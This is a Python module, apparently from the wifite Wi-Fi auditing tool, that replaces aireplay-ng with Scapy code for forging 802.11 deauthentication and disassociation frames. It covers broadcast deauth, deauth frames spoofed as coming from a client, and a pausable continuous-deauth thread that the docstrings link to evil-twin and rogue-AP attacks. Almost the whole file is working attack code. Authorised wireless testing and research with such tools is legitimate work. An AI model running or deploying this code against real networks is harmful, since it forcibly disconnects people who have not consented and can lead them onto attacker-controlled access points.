#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Scapy-based deauthentication frame injection.

Replaces 'aireplay-ng -0' with native Python/Scapy implementation.

Usage:
    from wifite.native.deauth import ScapyDeauth
    
    # Send deauth to broadcast (all clients)
    ScapyDeauth.deauth('wlan0mon', 'AA:BB:CC:DD:EE:FF')
    
    # Send deauth to specific client
    ScapyDeauth.deauth('wlan0mon', 'AA:BB:CC:DD:EE:FF', 
                       client_mac='11:22:33:44:55:66')
    
    # Continuous deauth (for evil twin attacks)
    deauther = ScapyDeauth.continuous('wlan0mon', 'AA:BB:CC:DD:EE:FF')
    deauther.start()
    # ... later ...
    deauther.stop()

Frame Types:
    - Deauthentication (subtype 0x0C): Terminates association
    - Disassociation (subtype 0x0A): Terminates reassociation
    
Reason Codes:
    - 1: Unspecified
    - 2: Previous auth no longer valid
    - 3: Station leaving (deauth/disassoc)
    - 4: Inactivity timer expired
    - 7: Class 3 frame from non-associated station
"""

import time
from threading import Thread, Event
from typing import Optional, Tuple, Callable

try:
    from scapy.all import (
        RadioTap, Dot11, Dot11Deauth, Dot11Disas,
        sendp, conf as scapy_conf
    )
    SCAPY_AVAILABLE = True
except Exception:
    SCAPY_AVAILABLE = False


class ScapyDeauth:
    """
    Native deauthentication using Scapy.
    
    Advantages over aireplay-ng:
    - No external process spawning
    - Direct control over packet crafting
    - Customizable reason codes
    - Better error handling
    - Lower overhead for continuous deauth
    """
    
    # Reason codes for deauthentication
    REASON_UNSPECIFIED = 1
    REASON_PREV_AUTH_INVALID = 2
    REASON_LEAVING = 3
    REASON_INACTIVITY = 4
    REASON_CLASS3_FROM_NONASSOC = 7
    
    # Default reason codes to cycle through (mimics aireplay behavior)
    DEFAULT_REASONS = [REASON_LEAVING, REASON_CLASS3_FROM_NONASSOC, REASON_UNSPECIFIED]
    
    # Broadcast address
    BROADCAST = 'FF:FF:FF:FF:FF:FF'
    
    @classmethod
    def is_available(cls) -> bool:
        """Check if Scapy is available for deauth."""
        return SCAPY_AVAILABLE
    
    @classmethod
    def deauth(cls, 
               interface: str, 
               bssid: str, 
               client_mac: Optional[str] = None,
               count: int = 5,
               reason: int = None,
               include_disassoc: bool = True,
               verbose: bool = False) -> Tuple[bool, int]:
        """
        Send deauthentication frames to a target.
        
        Args:
            interface: Monitor mode interface (e.g., 'wlan0mon')
            bssid: Target AP BSSID
            client_mac: Specific client MAC or None for broadcast
            count: Number of deauth packets to send
            reason: Deauth reason code (None = cycle through defaults)
            include_disassoc: Also send disassociation frames
            verbose: Enable Scapy verbose output
            
        Returns:
            Tuple of (success: bool, packets_sent: int)
        """
        if not SCAPY_AVAILABLE:
            return False, 0
        
        # Normalize MAC addresses
        bssid = bssid.upper()
        target = (client_mac.upper() if client_mac else cls.BROADCAST)
        
        packets = []
        reasons = [reason] if reason else cls.DEFAULT_REASONS
        
        for i in range(count):
            reason_code = reasons[i % len(reasons)]
            
            # Build deauth packet: AP -> Client
            # Frame: RadioTap / Dot11 / Dot11Deauth
            deauth_ap_to_client = (
                RadioTap() /
                Dot11(
                    type=0,      # Management frame
                    subtype=12,  # Deauthentication
                    addr1=target,  # Destination (client or broadcast)
                    addr2=bssid,   # Source (AP)
                    addr3=bssid    # BSSID
                ) /
                Dot11Deauth(reason=reason_code)
            )
            packets.append(deauth_ap_to_client)
            
            # Build deauth packet: Client -> AP (spoofed)
            if target != cls.BROADCAST:
                deauth_client_to_ap = (
                    RadioTap() /
                    Dot11(
                        type=0,
                        subtype=12,
                        addr1=bssid,   # Destination (AP)
                        addr2=target,  # Source (client, spoofed)
                        addr3=bssid    # BSSID
                    ) /
                    Dot11Deauth(reason=reason_code)
                )
                packets.append(deauth_client_to_ap)
            
            # Optionally include disassociation frames
            if include_disassoc:
                disassoc_ap_to_client = (
                    RadioTap() /
                    Dot11(
                        type=0,
                        subtype=10,  # Disassociation
                        addr1=target,
                        addr2=bssid,
                        addr3=bssid
                    ) /
                    Dot11Disas(reason=reason_code)
                )
                packets.append(disassoc_ap_to_client)
        
        try:
            # Disable Scapy's verbose output if not requested
            old_verbose = scapy_conf.verb
            scapy_conf.verb = verbose
            
            # Send packets
            sendp(packets, iface=interface, verbose=verbose, count=1)
            
            scapy_conf.verb = old_verbose
            return True, len(packets)
            
        except Exception as e:
            return False, 0
    
    @classmethod
    def deauth_with_callback(cls,
                             interface: str,
                             bssid: str,
                             client_mac: Optional[str] = None,
                             count: int = 5,
                             callback: Optional[Callable[[int], None]] = None,
                             inter: float = 0.1) -> Tuple[bool, int]:
        """
        Send deauth frames with per-packet callback.
        
        Useful for updating UI or checking for abort conditions.
        
        Args:
            interface: Monitor mode interface
            bssid: Target AP BSSID
            client_mac: Specific client or None for broadcast
            count: Number of deauth packets
            callback: Function called after each packet with packets_sent count
            inter: Inter-packet delay in seconds
            
        Returns:
            Tuple of (success: bool, packets_sent: int)
        """
        if not SCAPY_AVAILABLE:
            return False, 0
        
        bssid = bssid.upper()
        target = (client_mac.upper() if client_mac else cls.BROADCAST)
        
        packets_sent = 0
        reasons = cls.DEFAULT_REASONS
        
        try:
            for i in range(count):
                reason = reasons[i % len(reasons)]
                
                # AP -> Client deauth
                pkt = (
                    RadioTap() /
                    Dot11(type=0, subtype=12, addr1=target, addr2=bssid, addr3=bssid) /
                    Dot11Deauth(reason=reason)
                )
                sendp(pkt, iface=interface, verbose=False, count=1)
                packets_sent += 1
                
                # Client -> AP deauth (if targeting specific client)
                if target != cls.BROADCAST:
                    pkt = (
                        RadioTap() /
                        Dot11(type=0, subtype=12, addr1=bssid, addr2=target, addr3=bssid) /
                        Dot11Deauth(reason=reason)
                    )
                    sendp(pkt, iface=interface, verbose=False, count=1)
                    packets_sent += 1
                
                if callback:
                    callback(packets_sent)
                
                if inter > 0 and i < count - 1:
                    time.sleep(inter)
            
            return True, packets_sent
            
        except Exception as e:
            return False, packets_sent
    
    @classmethod
    def continuous(cls,
                   interface: str,
                   bssid: str,
                   client_mac: Optional[str] = None,
                   interval: float = 0.5,
                   burst_count: int = 5) -> 'ContinuousDeauth':
        """
        Create a continuous deauthentication attack.
        
        Args:
            interface: Monitor mode interface
            bssid: Target AP BSSID
            client_mac: Specific client or None for broadcast
            interval: Seconds between deauth bursts
            burst_count: Number of deauth packets per burst
            
        Returns:
            ContinuousDeauth thread object
        """
        return ContinuousDeauth(
            interface=interface,
            bssid=bssid,
            client_mac=client_mac,
            interval=interval,
            burst_count=burst_count
        )


class ContinuousDeauth(Thread):
    """
    Continuous deauthentication attack thread.
    
    Sends deauth packets at regular intervals until stopped.
    Can be paused/resumed (useful when clients connect to rogue AP).
    """
    
    def __init__(self,
                 interface: str,
                 bssid: str,
                 client_mac: Optional[str] = None,
                 interval: float = 0.5,
                 burst_count: int = 5):
        """
        Initialize continuous deauth.
        
        Args:
            interface: Monitor mode interface
            bssid: Target AP BSSID
            client_mac: Specific client or None for broadcast
            interval: Seconds between deauth bursts
            burst_count: Number of deauth packets per burst
        """
        super().__init__()
        self.daemon = True
        
        self.interface = interface
        self.bssid = bssid.upper()
        self.client_mac = client_mac.upper() if client_mac else None
        self.interval = interval
        self.burst_count = burst_count
        
        self._stop_event = Event()
        self._pause_event = Event()
        self._pause_event.set()  # Not paused by default
        
        # Statistics
        self.packets_sent = 0
        self.bursts_sent = 0
        self.start_time = None
        self.last_burst_time = None
        
        # Dynamically excluded MACs (e.g., clients that connected to our AP)
        self._excluded_macs = set()
    
    def run(self):
        """Main deauth loop."""
        if not SCAPY_AVAILABLE:
            return
        
        self.start_time = time.time()
        target = self.client_mac or ScapyDeauth.BROADCAST
        
        while not self._stop_event.is_set():
            # Check if paused
            self._pause_event.wait()
            
            if self._stop_event.is_set():
                break
            
            # Check if target is excluded
            if self.client_mac and self.client_mac in self._excluded_macs:
                time.sleep(0.5)
                continue
            
            # Send deauth burst
            try:
                success, sent = ScapyDeauth.deauth(
                    interface=self.interface,
                    bssid=self.bssid,
                    client_mac=self.client_mac,
                    count=self.burst_count,
                    verbose=False
                )
                
                if success:
                    self.packets_sent += sent
                    self.bursts_sent += 1
                    self.last_burst_time = time.time()

            except Exception as e:
                # Best-effort burst loop: keep running, but leave a trace so a
                # persistent failure isn't completely invisible.
                from ..util.logger import log_debug
                log_debug('ScapyDeauth', 'Deauth burst failed: %s' % e)

            # Wait for next burst
            self._stop_event.wait(timeout=self.interval)
    
    def stop(self):
        """Stop the continuous deauth."""
        self._stop_event.set()
        self._pause_event.set()  # Unblock if paused
        
        if self.is_alive():
            self.join(timeout=2.0)
    
    def pause(self):
        """Pause deauthentication."""
        self._pause_event.clear()
    
    def resume(self):
        """Resume deauthentication."""
        self._pause_event.set()
    
    def is_paused(self) -> bool:
        """Check if deauth is paused."""
        return not self._pause_event.is_set()
    
    def exclude_mac(self, mac: str):
        """
        Exclude a MAC from deauthentication.
        
        Useful when a client connects to rogue AP.
        """
        self._excluded_macs.add(mac.upper())
    
    def include_mac(self, mac: str):
        """Remove a MAC from the exclusion list."""
        self._excluded_macs.discard(mac.upper())
    
    def get_stats(self) -> dict:
        """
        Get deauth statistics.
        
        Returns:
            Dictionary with stats
        """
        elapsed = time.time() - self.start_time if self.start_time else 0
        return {
            'packets_sent': self.packets_sent,
            'bursts_sent': self.bursts_sent,
            'elapsed_time': elapsed,
            'paused': self.is_paused(),
            'running': not self._stop_event.is_set(),
            'excluded_macs': list(self._excluded_macs),
        }


def deauth(interface: str, 
           bssid: str, 
           client_mac: Optional[str] = None,
           count: int = 5) -> Tuple[bool, int]:
    """
    Convenience function: send deauth packets.
    
    Falls back to aireplay-ng if Scapy is unavailable.
    """
    if SCAPY_AVAILABLE:
        return ScapyDeauth.deauth(interface, bssid, client_mac, count)
    
    # Fallback to aireplay-ng
    try:
        from ..tools.aireplay import Aireplay
        Aireplay.deauth(bssid, client_mac=client_mac, num_deauths=count, interface=interface)
        return True, count
    except Exception:
        return False, 0


def is_available() -> bool:
    """Check if native deauth is available."""
    return SCAPY_AVAILABLE
